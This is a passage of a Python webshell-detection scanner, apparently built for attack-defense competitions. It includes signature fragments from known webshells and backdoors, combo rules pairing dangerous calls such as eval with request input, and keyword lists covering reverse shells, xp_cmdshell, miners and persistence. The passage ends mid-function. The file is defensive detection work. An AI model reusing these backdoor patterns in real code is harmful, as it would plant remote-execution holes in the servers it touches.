    ("Set file = fso.GetFile(filepath)", 70),
    ("Vanquish - DLL injection failed:", 70),
    ("WinShell v5.0 (C)2002 janker.org", 70),
    ("case 'T':systemTools(out);break;", 70),
    ("ereg('^[[:blank:]]*cd[[:blank:]]", 70),
    ("if  FP  =  \"RefreshFolder\"  or  ", 70),
    ("if($content){unlink('evex.php');", 70),
    ("set folder = fso.GetFolder(path)", 70),
    ("{$row[] = \"<b>Owner/Group</b>\";}", 70),
    ("#popmsghello,are you all right?", 70),
    ("$(\"#dialog\").dialog(\"destroy\");", 70),
    ("/* connectback-backdoor on perl", 70),
    ("// password (default is: b374k)", 70),
    ("9 9$9(9,9P9X9\\9`9d9h9l9p9t9x9|9", 70),
    ("<form name=\"dns\" method=\"POST\">", 70),
    ("<title>Laudanum Kill nc</title>", 70),
    ("CreateAndDeleteFolder is error:", 70),
    ("DIGO CORROMPIDO<BR>CORRUPT CODE", 70),
    ("News Remote PHP Shell Injection", 70),
    ("by PHP Emperor<xb5@hotmail.com>", 70),
    ("halon synscan 127.0.0.1 1-65536", 70),
    ("lIENPTk47DQpleGl0IDA7DQp9DQp9\";", 70),
    ("value='Calistirmak istediginiz ", 70),
    ("wp_enqueue_script(\"swfobject\");", 70),
    ("$data .= \"#Database: $database", 70),
    ("// Dump Database [pacucci.com]", 70),
    ("// cmd.php = Command Execution", 70),
    ("<title>Remote Explorer</title>", 70),
    ("Failure ... Access is Denied !", 70),
    ("Opening Service .... Failure !", 70),
    ("Recieved respond from server!!", 70),
    ("SCROLLBAR-FACE-COLOR: #e8e7e7;", 70),
    ("SCROLLBAR-TRACK-COLOR: #91AAFF", 70),
    ("Server %s Have Been Configured", 70),
    ("VictimID = fm_NStr(Victims(i))", 70),
    ("if(eregi(\"./shbd $por\",$scan))", 70),
    ("mailto:rhfactor@antisocial.com", 70),
    ("             //Authentication", 45),
    ("$admin['cookielife'] = 86400;", 45),
    ("$info .= (($perms & 0x0008) ?", 45),
    ("***  laudanum@secureideas.net", 45),
    ("/* <!-- End of Actions --> */", 45),
    ("// php://input based backdoor", 45),
    (":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:", 45),
    ("<jsp-file>/cmd.jsp</jsp-file>", 45),
    ("<td width=\"49%\" height=\"142\">", 45),
    ("=====Remote Shell Closed=====", 45),
    ("Created by greenwood from n57", 45),
    ("Error during CryptCreateHash!", 45),
    ("LorD of IRAN HACKERS SABOTAGE", 45),
    ("Mode Shell v1.0</font></span>", 45),
    ("Set objCmd = wShell.Exec(cmd)", 45),
    ("String disr = dis.readLine();", 45),
    ("W A R N I N G: Private Server", 45),
    ("global $file_name, $filename;", 45),
    ("if (file_exists($uploaded)) {", 45),
    ("javascript:Command('Download'", 45),
    ("scrollbar-face-color:#E4E4F3;", 45),
    ("sth junk the M$ Wind0wZ retur", 45),
    ("while($level--) chdir(\"..\"); ", 45),
    ("{mkdir(\"$dizin/$duzenx2\",777)", 45),
    ("\"@$SERVER_NAME \".exec(\"pwd\")", 45),
    ("#every command you excecute.", 45),
    ("$admin['cookiedomain'] = '';", 45),
    ("$dump_file.='`'.$rows2[0].'`", 45),
    ("$sql1 .= $row[1].\"\\r\\n\\r\\n\";", 45),
    ("'ru_text12' => 'back-connect", 45),
    ("<TITLE>404 Not Found</TITLE>", 45),
    ("<cfif IsDefined(\"form.cmd\")>", 45),
    (">[*] Safemode Mode Run</DIV>", 45),
    ("Mail: chinese@hackermail.com", 45),
    ("RAW D.O.S. COMMAND INTERFACE", 45),
    ("RtlAnsiStringToUnicodeString", 45),
    ("Script Gecisi Tamamlayamadi!", 45),
    ("Variable Name</B></font></p>", 45),
    ("http://michaeldaw.org   2006", 45),
    ("if( file_exists($file_name))", 45),
    ("printf(\"Sie ist %u Bytes gro", 45),
    ("public function __activate()", 45),
    ("#Acesso a Shel - 1 ON 0 OFF", 45),
    ("$sqlquicklaunch[] = array(\"", 45),
    ("/^ctcpflood\\s+(\\d+)\\s+(\\S+)", 45),
    ("@ini_set('error_log',NULL);", 45),
    ("cmd\", \"/C\"}; // Dos,Windows", 45),
    ("print shell_exec($command);", 45),
    ("\"Program Files\\Serv-u\\Serv", 45),
    ("''''''''''''''''''DaJKHPam", 45),
    (".$arrow.\"</b>\",in('text','", 45),
    ("//define('pass','123456');", 45),
    ("JSP Backdoor Reverse Shell", 45),
    ("Server.ScriptTimeout = 180", 45),
    ("Simorgh Security Magazine ", 45),
    ("Site: http://blog.weili.me", 45),
    ("Usage -- hiderun [AppName]", 45),
    ("background-color: #EBEAEA;", 45),
    ("case 15: $image .= \"\\21\\0\\", 45),
    ("else if( $mode & 0xA000 ) ", 45),
    ("eval(getenv('HTTP_CODE'));", 45),
    ("function FuncQueueObject()", 45),
    ("if (tempF.isDirectory()) {", 45),
    ("name=\"duzenx2\" value=\"Klas", 45),
    ("packet dropped,redirecting", 45),
    ("please enter the password:", 45),
    ("strBackDoor = strBackDoor ", 45),
    ("sword set> [Leith=0 bytes]", 45),
    ("var message=\"SaNaLTeRoR - ", 45),
    ("'eng_text30'=>'Cat file',", 45),
    ("1,121>1C1K1Q1X1^1e1k1s1y1", 45),
    ("8@;D;H;L;P;T;X;\\;a;9=W=z=", 45),
    ("<!-- <tr align=\"center\"> ", 45),
    ("<!-- PageServer Below -->", 45),
    ("<!-- PageUpload Below -->", 45),
    ("CreateRemoteThread error!", 45),
    ("EVENT_SINK_QueryInterface", 45),
    ("Function MorfiCoder(Code)", 45),
    ("ImageDirectoryEntryToData", 45),
    ("Web: http://www.4ngel.net", 45),
    ("WriteProcessMemory error!", 45),
    ("\\\\.\\mailslot\\hxdef-rkc000", 45),
    ("\\final\\new\\lcc\\public.dll", 45),
    ("backdoor is corrupted on ", 45),
    ("if (file_exists(\"F:\\\\\")){", 45),
    ("var_dump(curl_exec($ch));", 45),
    (".::[c0derz]::. web-shell", 45),
    ("// a simple php backdoor", 45),
    ("<a bookmark=\"minipanel\">", 45),
    ("However you are lucky :P", 45),
    ("String _password =\"111\";", 45),
    ("\\*=-- MEMBERS AREA --=*/", 45),
    ("array_map(\"asx73ert\",(ar", 45),
    ("capGetDriverDescriptionA", 45),
    ("copy($file,\"$filename\");", 45),
    ("http://www.ru24-team.net", 45),
    ("mailto:mailbomb@hotmail.", 45),
    ("netstat -atup | grep IST", 45),
    ("which wget curl w3m lynx", 45),
    ("\"\"%windir%\\\\calc.exe\"\")", 45),
    ("0 0&00060K0R0X0f0l0q0w0", 45),
    ("3&31383>3F3Q3X3`3f3w3|3", 45),
    ("include('php://input');", 45),
    ("mailto:BuqX@hotmail.com", 45),
    ("print << \"[kalabanga]\";", 45),
    ("www.rootshell-team.info", 45),
    (" - ExpDoor.com</title>", 45),
    ("#phpMyAdmin MySQL-Dump", 45),
    ("&G3 Users In RegistryD", 45),
    ("//If no pass then hash", 45),
    ("<!-- PageFSO Below -->", 45),
    ("<TITLE>Expdoor.com ASP", 45),
    ("RegisterServiceProcess", 45),
    ("__GLOBAL_HEAP_SELECTED", 45),
    ("copy($uploaded, $dez);", 45),
    ("file_put_contents($pth", 45),
    ("function execute($com)", 45),
    ("fwrite ($fp, \"$yazi\");", 45),
    ("if ($portscan != \"\") {", 45),
    ("smkim@popeye.snu.ac.kr", 45),
    ("        system($cmd);", 45),
    (" *   Coded by Pixcher", 45),
    ("\">www.Expdoor.com</a>", 45),
    (".mm(\"Eval PHP code\").", 45),
    ("// by: The Dark Raver", 45),
    ("4@5P5T5\\5T7\\7d7l7t7|7", 45),
    (": :$:(:,:0:4:8:D:`=d=", 45),
    (";;;Y;`;d;h;l;p;t;x;|;", 45),
    ("<!--    </form>   -->", 45),
    ("<title>GO.cgi</title>", 45),
    ("Fail To Open Registry", 45),
    ("GetProcAddress error!", 45),
    ("ION\\System\\FloatingPo", 45),
    ("MSComDlg.CommonDialog", 45),
    ("VirtualAllocEx error!", 45),
    ("_|_  O    _    O  _|_", 45),
    ("atrix@irc.brasnet.org", 45),
    ("const adminPassword=\"", 45),
    ("http://michaeldaw.org", 45),
    ("shell.php?qid=zxexp  ", 45),
    ("unable to connect to ", 45),
    ("vint21h@c0derz.org.ua", 45),
    ("*** Laudanum Project", 45),
    ("<b>--Coded by Silver", 45),
    ("<li>Reverse Shell - ", 45),
    ("@error_reporting(0);", 45),
    ("@set_time_limit(0); ", 45),
    ("All Files(*.*)|*.*||", 45),
    ("Codz by angel(4ngel)", 45),
    ("ConnectBack Backdoor", 45),
    ("Emperor Hacking TEAM", 45),
    ("ION\\System\\Floating-", 45),
    ("META-INF/MANIFEST.MF", 45),
    ("Restore Old Vanquish", 45),
    ("User-Agent: aQ0O010O", 45),
    ("__MSVCRT_HEAP_SELECT", 45),
    ("__vbaHresultCheckObj", 45),
    ("ail To Open Registry", 45),
    ("const userPassword=\"", 45),
    ("copy ( $dosya_gonder", 45),
    ("http://c0derz.org.ua", 45),
    ("http://www.4ngel.net", 45),
    ("sod=Array(\"D\",\"7\",\"S", 45),
    (" www.cyberlords.net", 45),
    ("0)0O0\\0a0o0\"1E1P1q1", 45),
    ("9(90989@9V9^9f9n9v9", 45),
    ("<.<I<d<h<l<p<t<x<|<", 45),
    ("=$=)=/=<=Y=_=j=p=z=", 45),
    ("@ini_set(\"highlight", 45),
    ("Coded by n0 [nZer0]", 45),
    ("CreateThread False!", 45),
    ("IsCharAlphaNumericA", 45),
    ("Test.AspxSpyPlugins", 45),
    ("http://vnhacker.org", 45),
    ("maceo @ dogmile.com", 45),
    ("rand(1,99999);$sj98", 45),
    ("session(\"shagman\")=", 45),
    ("zombie_array=array(", 45),
    ("$command .= ' -F';", 45),
    ("' File: CmdAsp.asp", 45),
    ("<-- CmdAsp.asp -->", 45),
    ("<H1>Not Found</H1>", 45),
    ("Check Cloneomplete", 45),
    ("CreateProcessW: %S", 45),
    ("EVENT_SINK_Release", 45),
    ("GetModuleBaseNameA", 45),
    ("OpenProcess error!", 45),
    ("ReInstall Vanquish", 45),
    ("RusH security team", 45),
    ("URLDownloadToFileA", 45),
    ("Writed by DreAmeRz", 45),
    ("[*] Spawning Shell", 45),
    ("\\Debug\\dllTest.pdb", 45),
    ("__vbaErrorOverflow", 45),
    ("__vbaExceptHandler", 45),
    ("http://rst.void.ru", 45),
    ("packet door client", 45),
    ("www.ironwarez.info", 45),
    ("www.simorgh-ev.com", 45),
    ("1\"1;1X1^1e1m1w1~1", 45),
    ("@exec($cfe,$res);", 45),
    ("EVENT_SINK_AddRef", 45),
    ("Mehdi & HolyDemon", 45),
    ("No Query Executed", 45),
    ("Port Number Error", 45),
    ("WEB-INF/web.xmlPK", 45),
    ("WSAStartup Error!", 45),
    ("\\BDoor\\DllInjecti", 45),
    ("\\BDoor\\SetupBDoor", 45),
    ("a CGI by Fuzzyman", 45),
    ("c:\\downloaded.zip", 45),
    ("r3v3ng4ns\\nDigite", 45),
    ("set_time_limit(0)", 45),
    ("teToWideChar^FiYP", 45),
    ("%ComSpec% /c dir", 45),
    ("// Block special", 45),
    ("//Authentication", 45),
    ("/index.php?host=", 45),
    ("GetDIBColorTable", 45),
    ("GetLogicalDrives", 45),
    ("HandlereateConso", 45),
    ("Php Shell <br />", 45),
    ("Ru24PostWebShell", 45),
    ("RundllUninstallA", 45),
    ("TCP Send Error!!", 45),
    ("UninstallService", 45),
    ("WinShell Service", 45),
    ("c99ftpbrutecheck", 45),
    ("class backdoor {", 45),
    ("filename: backup", 45),
    ("nDexEr - Reader\"", 45),
]


# ==== YARA 规则库特征结束 ====

# 扩展名 -> (语言, 规则组)
# PHP 全量组：基础执行/编码/文件/网络 + 新增的变量注入、僵尸马、打包马、
#              工具签名、冰蝎/哥斯拉样本特征、挖矿、SEO、数据库、持久化
_PHP_FULL = [
    PHP_EXEC, PHP_EVAL, PHP_CALLBACK, PHP_OBFUSC, PHP_FILE, PHP_NET,
    PHP_SUPER, PHP_MARKER, PHP_INJECT, PHP_ZOMBIE, PHP_PACKED,
    PHP_TOOL_SIG, BEHINDER_SIG, GODZILLA_SIG, PHP_MINER, PHP_SEO,
    PHP_DB, PERSIST_RULES, EVASION_RULES,
    YARA_PHP_SIGS, YARA_GENERIC_SIGS,
]
_PHP_LITE = [
    PHP_EXEC, PHP_EVAL, PHP_CALLBACK, PHP_OBFUSC, PHP_FILE, PHP_SUPER,
    PHP_INJECT, PHP_ZOMBIE, PHP_TOOL_SIG, BEHINDER_SIG, GODZILLA_SIG,
    EVASION_RULES, YARA_PHP_SIGS,
]
_ASP_FULL = [ASP_ENTRIES, ASP_OBFUSC, ASP_EX, PHP_TOOL_SIG, PERSIST_RULES,
             EVASION_RULES, YARA_ASP_SIGS, YARA_GENERIC_SIGS]

TYPE_RULES = {
    "php":  ("PHP",  _PHP_FULL),
    "phtml": ("PHP", _PHP_FULL),
    "php3": ("PHP",  _PHP_LITE),
    "php4": ("PHP",  _PHP_LITE),
    "php5": ("PHP",  _PHP_LITE),
    "php7": ("PHP",  _PHP_LITE),
    "php8": ("PHP",  _PHP_LITE),
    "inc":  ("PHP",  _PHP_LITE),
    "asp":  ("ASP",  _ASP_FULL),
    "asa":  ("ASP",  [ASP_ENTRIES, ASP_OBFUSC, ASP_EX]),
    "cer":  ("ASP",  [ASP_ENTRIES, ASP_OBFUSC]),
    "aspx": ("ASPX", [ASPX_ENTRIES, ASPX_DEEP, PERSIST_RULES, EVASION_RULES, YARA_ASP_SIGS, YARA_GENERIC_SIGS]),
    "ashx": ("ASPX", [ASPX_ENTRIES, ASPX_DEEP, EVASION_RULES, YARA_ASP_SIGS]),
    "asmx": ("ASPX", [ASPX_ENTRIES, ASPX_DEEP, EVASION_RULES, YARA_ASP_SIGS]),
    "jsp":  ("JSP",  [JSP_ENTRIES, PERSIST_RULES, EVASION_RULES, YARA_JSP_SIGS]),
    "jspx": ("JSP",  [JSP_ENTRIES, YARA_JSP_SIGS]),
    "jspf": ("JSP",  [JSP_ENTRIES, YARA_JSP_SIGS]),
    "htaccess": ("HTACCESS", [HTACCESS_RULES]),
    # 浏览器/配置类文件也可能藏马（这类扩展名常被扫描器跳过，这里补上）
    "js":   ("JS",   [JS_RULES]),
    "css":  ("JS",   [JS_RULES]),
    "txt":  ("JS",   [JS_RULES]),
    "html": ("JS",   [JS_RULES]),
    "htm":  ("JS",   [JS_RULES]),
    "xml":  ("JS",   [JS_RULES]),
}

# .htaccess 的完整文件名(无扩展名，需单独匹配)
HTACCESS_NAMES = {".htaccess", ".user.ini", "php.ini", ".htpasswd", "web.config"}

# 组合规则：同时命中才计重分（危险函数链，权重高于单条规则）
COMBO_RULES = [
    (("base64_decode", "eval"), 120, "base64_decode + eval 一句话"),
    (("gzinflate", "eval"), 120, "gzinflate + eval 一句话"),
    (("gzuncompress", "eval"), 120, "gzuncompress + eval 一句话"),
    (("str_rot13", "eval"), 110, "str_rot13 + eval 一句话"),
    (("strrev", "eval"), 100, "strrev + eval 一句话"),
    (("$_post[", "eval"), 130, "POST 传入 + eval"),
    (("$_post[", "assert"), 130, "POST 传入 + assert"),
    (("system", "$_get["), 130, "system + GET 传参一句话"),
    (("system", "$_post["), 130, "system + POST 传参一句话"),
    (("system", "$_request["), 130, "system + REQUEST 传参一句话"),
    (("exec", "$_get["), 130, "exec + GET 传参一句话"),
    (("exec", "$_post["), 130, "exec + POST 传参一句话"),
    (("shell_exec", "$_"), 130, "shell_exec + 外部输入"),
    (("passthru", "$_"), 130, "passthru + 外部输入"),
    (("proc_open", "$_"), 130, "proc_open + 外部输入"),
    (("request(", "eval"), 120, "ASP: request + eval"),
    (("request(", "execute"), 120, "ASP: request + execute"),
    (("createobject(", "execute"), 120, "ASP: CreateObject + execute"),
    (("frombase64string", "assembly"), 130, "ASPX: Base64 反射加载"),
    (("call_user_func", "$_"), 110, "回调函数 + 外部输入"),
    (("array_map", "$_"), 100, "array_map 回调注入"),
    (("fsockopen", "$_"), 120, "fsockopen + 外部输入(可能反弹shell)"),
    (("create_function", "base64_decode"), 120, "create_function + base64 动态建马"),
    (("preg_replace", "/e"), 130, "preg_replace /e 修饰符执行"),
    (("assert", "$_"), 120, "assert + 外部输入"),
    (("system.diagnostics.process", "start("), 130, "ASPX: Process.Start 命令执行"),
    (("process", "cmd.exe"), 130, "ASPX: 调用 cmd.exe"),
    (("processstartinfo", "redirectstandardoutput"), 120, "ASPX: 命令回显"),
    (("runtime.getruntime().exec", "request.getparameter"), 130, "JSP: exec + 请求参数"),
    (("processbuilder", ".start("), 130, "JSP: ProcessBuilder 命令执行"),
    (("runtime.exec", "request."), 120, "JSP: Runtime.exec + 请求参数"),
    # ---- 以下组合来自样本级与维度级特征 ----
    # 冰蝎 Behinder
    (("php://input", "openssl_decrypt"), 150, "冰蝎PHP: php://input + openssl_decrypt"),
    (("php://input", "{eval("), 150, "冰蝎PHP: php://input + {eval("),
    (("uniqid(rand", "substr(md5"), 150, "冰蝎PHP: 会话密钥生成指纹"),
    (("request.binaryread", "xor asc(mid"), 150, "冰蝎ASP: BinaryRead + Xor 解密"),
    (("cipher.getinstance(\"aes\")", "defineclass"), 150, "冰蝎JSP: AES + defineClass"),
    (("rijndaelmanaged", "createdecryptor"), 140, "冰蝎ASPX: Rijndael 解密链"),
    # 哥斯拉 Godzilla
    (("explode('|'", "base64_decode"), 140, "哥斯拉PHP: explode('|') + base64"),
    (("system.bitconverter.tostring", "rijndaelmanaged"), 150, "哥斯拉ASPX: BitConverter + Rijndael"),
    (("javax.crypto.cipher.getinstance", "defineclass"), 150, "哥斯拉JSP: Cipher + defineClass"),
    # 变量注入 / 回调注入
    (("extract(", "$_"), 120, "变量注入: extract + 外部输入"),
    (("extract(", "eval"), 130, "变量注入: extract + eval"),
    (("parse_str(", "eval"), 120, "变量注入: parse_str + eval"),
    # 注：array_walk/array_filter/usort/uasort($_POST,'trim') 是常见安全实践，
    #     单凭"回调函数+外部输入"会误报，故只保留"回调指向危险函数"的组合
    (("array_walk", "assert"), 130, "array_walk 回调指向 assert"),
    (("array_walk", "system"), 130, "array_walk 回调指向 system"),
    (("array_map", "assert"), 130, "array_map 回调指向 assert"),
    (("array_filter", "assert"), 130, "array_filter 回调指向 assert"),
    (("uasort", "assert"), 120, "uasort 回调指向 assert"),
    (("uksort", "assert"), 120, "uksort 回调指向 assert"),
    (("call_user_func", "assert"), 130, "call_user_func 指向 assert"),
    (("preg_replace_callback", "assert"), 130, "preg_replace_callback 指向 assert"),
    (("register_shutdown_function", "eval"), 130, "register_shutdown_function 后门"),
    (("session_set_save_handler", "$_"), 120, "session_set_save_handler 会话劫持"),
    (("ob_start", "eval"), 120, "ob_start 输出缓冲劫持"),
    (("reflectionfunction", "$_"), 120, "反射函数调用 + 外部输入"),
    # 僵尸马 / 打包马
    (("ignore_user_abort", "set_time_limit(0)"), 140, "僵尸马: 忽略中断 + 取消超时"),
    (("__destruct", "unlink("), 130, "僵尸马: 析构自删除"),
    (("__halt_compiler", "eval"), 150, "打包马: __HALT_COMPILER + eval"),
    (("phar://", "$_"), 120, "Phar 反序列化利用"),
    # 数据库 / 持久化
    (("into outfile", "select"), 140, "SQL 写文件(INTO OUTFILE)"),
    (("xp_cmdshell", "exec"), 150, "MSSQL xp_cmdshell 提权"),
    (("load_file(", "union"), 130, "SQL 读文件(load_file)"),
    (("schtasks", "/create"), 140, "计划任务持久化"),
    (("crontab", "-l"), 110, "crontab 持久化探测"),
    # 挖矿
    (("stratum", "xmrig"), 150, "挖矿: stratum + XMRig"),
    (("cryptonight", "-o"), 140, "挖矿: cryptonight 矿池参数"),
    # 注：不可用 ("<?php","$_POST[") 这类组合 —— 正常表单脚本必然同现，
    #     静态文件藏马由 JS_RULES 里的 "<?php"(100) 自身覆盖
]

PIC_EXT = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico"}
# 图片只取头部即可判定"图片马"(图片头 + 脚本标签)，避免拉取大文件
PIC_HEAD_BYTES = 16 * 1024

# "危险代码注释"功能写在行内的隔离标记。
# 扫描时会跳过带此标记的行 —— 否则处置后复扫仍会因注释里的 eval( 字样反复报警
# （本工具是文本级检测，不解析注释语义）。
QUARANTINE_TAG = "[MetaAWD-QUARANTINE]"
_QUARANTINE_TAG_B = QUARANTINE_TAG.encode()

# 扫描排除项：本工具自身部署的 WAF 文件内含大量黑名单关键词(如 system/eval)，
# 若参与扫描必然误报；另外排除常见缓存/依赖目录以减少噪声与耗时。
EXCLUDE_DIR_NAMES = {".phpwaf", "node_modules", "vendor", ".git", ".svn", "__pycache__"}
EXCLUDE_FILE_PATTERNS = ("waf.php", ".waf.php")

# 判定阈值：文件得分 >= 阈值 判「恶意」，>= 阈值 x SUSPECT_RATIO 判「可疑」，否则干净。
# 分数由命中特征按危险程度加权累加（详见 README「检测阈值说明」）。
# 调低更激进（检出↑ 误报↑），调高更保守（检出↓ 误报↓）。
DEFAULT_THRESHOLD = 200

# 「可疑」线的比例：可疑线 = 阈值 x 该比例。
# 与阈值联动 —— 调高阈值会同时抬高恶意线与可疑线，整体更保守；反之更激进。
# GUI 的「阈值说明」用它向用户展示两条线的实际位置。
SUSPECT_RATIO = 0.40
MAX_REMOTE_FILE_SIZE = 2 * 1024 * 1024
# 文件数不超过该值时全量拉取精确判定；超过才启用 grep 粗筛(保证不因粗筛漏报)
FULL_SCAN_LIMIT = 800
# 远端粗筛用的高频高危关键词，用于先把范围缩小
# 注：粗筛是"或"关系，宁可多拉几个候选也不能漏 —— 新增规则组的关键词都要覆盖
REMOTE_GREP_KEYWORDS = (
    # 基础执行/编码/文件
    "eval|assert|system|exec|passthru|shell_exec|proc_open|popen|pcntl_exec|"
    "base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|strrev|create_function|"
    "call_user_func|preg_replace|array_map|array_walk|array_filter|usort|uasort|uksort|"
    "file_put_contents|file_get_contents|fwrite|fputs|move_uploaded_file|copy|rename|"
    "php:\\/\\/input|php:\\/\\/filter|phar:\\/\\/|fsockopen|socket_create|curl_|"
    # 变量注入 / 僵尸马 / 打包马
    "extract\\(|parse_str|\\$_POST|\\$_GET|\\$_REQUEST|\\$_COOKIE|\\$GLOBALS|"
    "__destruct|ignore_user_abort|__halt_compiler|set_time_limit|"
    # 已知工具签名（样本级特征）
    "c99shell|phpspy|r57shell|b374k|weevely|quasibot|cnseay|EgY_SpIdEr|jshell|jspSpy|"
    # 冰蝎 / 哥斯拉
    "openssl_decrypt|uniqid\\(rand|Request.BinaryRead|Xor Asc|Cipher.getInstance|"
    "defineClass|RijndaelManaged|MD5CryptoServiceProvider|Substring\\(16\\)|explode\\('\\|'|"
    # 挖矿
    "stratum|XMRig|cryptonight|moneropool|xmrpool|"
    # SEO 寄生虫
    "ADJSC00002|aQ0O010O|Remote_directory|DeAsc|SetRequestHeader|"
    # 数据库 / 持久化
    "INTO OUTFILE|INTO DUMPFILE|load_file|xp_cmdshell|sys_exec|schtasks|crontab|"
    # ASPX/.NET 细粒度
    "ProcessStartInfo|RegistryKey|System.Management|ManagementObject|ServiceController|"
    "System.Codedom|CSharpCodeProvider|VirtualPathProvider|BuildManager|"
    "ObjectStateFormatter|LosFormatter|Assembly.Load|DllImport"
)

# 词边界判定用字符集
_IDENT = set(b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_$")

# 组合规则里的"纯函数名/标识符"关键词（如 exec、system）必须带词边界匹配，
# 否则 exec 会命中 execute、system 会命中 subsystem 这类正常代码
_COMBO_IDENT_RE = re.compile(r"^[a-z_][a-z0-9_]*$")


# ==================================================================== 核心判定
def count_wordlike(text_bytes, kw_bytes):
    """统计 kw 以标识符边界出现的次数，避免命中更长标识符的一部分"""
    n = 0
    start = 0
    kw_len = len(kw_bytes)
    while True:
        i = text_bytes.find(kw_bytes, start)
        if i < 0:
            break
        start = i + 1
        if i > 0 and kw_bytes[:1] not in (b"$", b"_"):
            if text_bytes[i - 1] in _IDENT:
                continue
        j = i + kw_len
        if (j < len(text_bytes) and text_bytes[j] in _IDENT
                and not kw_bytes.endswith((b"(", b"[", b"."))):
            continue
        n += 1
    return n


def _combo_kw_hit(kw, text, tb):
    """组合规则的关键词匹配。

    纯标识符(exec/system/assert 等)走词边界，避免 exec 命中 execute、
    system 命中 subsystem；带 $ ( [ . 等符号的关键词按子串匹配。
    """
    if _COMBO_IDENT_RE.match(kw):
        return count_wordlike(tb, kw.encode("utf-8")) > 0
    return kw in text


def find_wordlike_offsets(text_bytes, kw_bytes, limit=32):
    """返回 kw 以标识符边界出现的字节偏移列表（判定逻辑与 count_wordlike 一致）"""
    out = []
    start = 0
    kw_len = len(kw_bytes)
    n = len(text_bytes)
    while len(out) < limit:
        i = text_bytes.find(kw_bytes, start)
        if i < 0:
            break
        start = i + 1
        if i > 0 and kw_bytes[:1] not in (b"$", b"_"):
            if text_bytes[i - 1] in _IDENT:
                continue
        j = i + kw_len
        if (j < n and text_bytes[j] in _IDENT
                and not kw_bytes.endswith((b"(", b"[", b"."))):
            continue
        out.append(i)
    return out


def _line_starts(raw):
    """返回每一行起始字节偏移（用于字节偏移 -> 行号换算）"""
    starts = [0]
    pos = raw.find(b"\n")
    while pos >= 0:
        starts.append(pos + 1)
        pos = raw.find(b"\n", pos + 1)
    return starts


def collect_hit_lines(raw, kws, max_lines=40):
    """把命中的特征串定位到具体行，供"注释危险代码"使用。

    返回 [{line, kw, text}]，按行号升序、同行为一条（保留首个命中特征）。
    位置查找统一在 raw.lower() 上做（bytes.lower 只影响 ASCII，偏移与原文一致），
    避免 UTF-8/GBK 解码导致的偏移错位。
    """
    low = raw.lower()
    starts = _line_starts(raw)
    found = []
    for kw in sorted(set(kws)):
        kb = kw.encode("utf-8")
        if len(kb) < 4:
            continue
        for off in find_wordlike_offsets(low, kb):
            found.append((off, kw))
    found.sort()

    out, seen = [], set()
    for off, kw in found:
        ln = bisect_right(starts, off)
        if ln in seen:
            continue
        seen.add(ln)
        s = starts[ln - 1]
        e = raw.find(b"\n", s)
        if e < 0:
            e = len(raw)
        raw_line = raw[s:e]
        out.append({
            "line": ln,
            "kw": kw,
            "text": raw_line.decode("utf-8", "replace").rstrip("\r")[:300],
            # 该命中行是否已被本工具注释过（用于打 [已注释] 标记）
            "quarantined": _QUARANTINE_TAG_B in raw_line,
        })
        if len(out) >= max_lines:
            break
    return out


def is_excluded_path(path):
    """判断路径是否属于扫描排除项(WAF 自身 / 依赖目录 / 缓存)"""
    parts = path.replace("\\", "/").split("/")
    for part in parts[:-1]:
        if part in EXCLUDE_DIR_NAMES:
            return True
    base = parts[-1].lower()
    return base in EXCLUDE_FILE_PATTERNS


def analyze_bytes(raw, filename, threshold=DEFAULT_THRESHOLD):
    """对文件内容做检测，返回结果字典；不支持的扩展名返回 None"""
    if is_excluded_path(filename):
        return None
    basename = os.path.basename(filename).lower()
    ext_with_dot = os.path.splitext(basename)[1].lower()
    is_pic = ext_with_dot in PIC_EXT

    if basename in HTACCESS_NAMES:
        lang, groups = TYPE_RULES["htaccess"]
    elif is_pic:
        # 图片只做"图片马"判定(图片头 + 脚本标签)
        lang, groups = "PIC", []
    else:
        ext = ext_with_dot.lstrip(".")
        info = TYPE_RULES.get(ext)
        if not info:
            return None
        lang, groups = info

    # 统计已被本工具注释(隔离)的行。注意：注释行**仍然参与检测** ——
    # 复扫时照常报出该文件，只在结果里打上 [已注释] 标记，
    # 便于一眼看出"这里还有木马代码，但已经处置过了"。
    quarantined = 0
    if _QUARANTINE_TAG_B in raw:
        quarantined = sum(1 for ln in raw.split(b"\n") if _QUARANTINE_TAG_B in ln)

    # 解码：优先 UTF-8，失败才用 GBK 兜底(避免同一内容被解两遍导致计数翻倍)
    try:
        text = raw.decode("utf-8").lower()
    except UnicodeDecodeError:
        text = raw.decode("gbk", errors="ignore").lower()
    except Exception:
        text = raw.decode("latin1", errors="ignore").lower()
    tb = text.encode("utf-8", errors="ignore")

    hits = []
    score = 0
    hit_kws = []          # 命中特征（用于定位具体行，供"注释危险代码"使用）
    for group in groups:
        for kw, weight in group:
            if not kw or weight <= 0:
                continue
            kb = kw.encode("utf-8")
            # 匹配策略分三种：
            #  1) 长片段(>=20B，多来自 YARA 库的样本级签名)：自带足够特异性，
            #     直接子串匹配；套用词边界反而漏检 —— 以普通字母结尾的代码
            #     片段会被误判为"落在更长标识符内部"
            #  2) 以非标识符字符开头的特征(如 #@~^ / /*-/*-*/ / <%@ page)：
            #     词边界概念不适用，直接子串匹配
            #  3) 其余(纯标识符、函数名)：走词边界，避免 eval 命中 reeval
            first = kb[:1]
            if len(kb) >= 20 or not (first.isalpha() or first == b"_"):
                cnt = tb.count(kb)
            else:
                cnt = count_wordlike(tb, kb)
            if cnt:
                score += weight * (1 if cnt == 1 else (1.5 if cnt <= 3 else 2))
                hits.append(f"{kw}x{cnt}" if cnt > 1 else kw)
                hit_kws.append(kw)

    for kws, weight, desc in COMBO_RULES:
        if all(_combo_kw_hit(k, text, tb) for k in kws):
            score += weight
            hits.append(f"[组合]{desc}")
            # 组合里的纯标识符可定位(如 exec/assert)；带符号的片段($_POST 等)会散落多处，不用于定位
            hit_kws.extend(k for k in kws if _COMBO_IDENT_RE.match(k) and len(k) >= 4)

    # PHP 变量函数调用 $var($_...) —— 变量函数后门的核心形态。
    # 正常业务代码极少把超全局变量直接当函数名调用，故给高权重。
    if lang == "PHP":
        if re.search(rb"\$[a-z_]\w*\s*\(\s*\$", raw, re.I):
            score += 120
            hits.append("[变量函数调用 $var($_...)]")
        # 字符串拼接构造函数名（"ass"."ert" 这类规避手法）
        if re.search(rb"[\"'][a-z_]{1,12}[\"']\s*\.\s*[\"'][a-z_]{1,12}[\"']", raw, re.I):
            score += 55
            hits.append("[字符串拼接函数名]")

    if lang == "PHP":
        head = raw[:4096]
        if head:
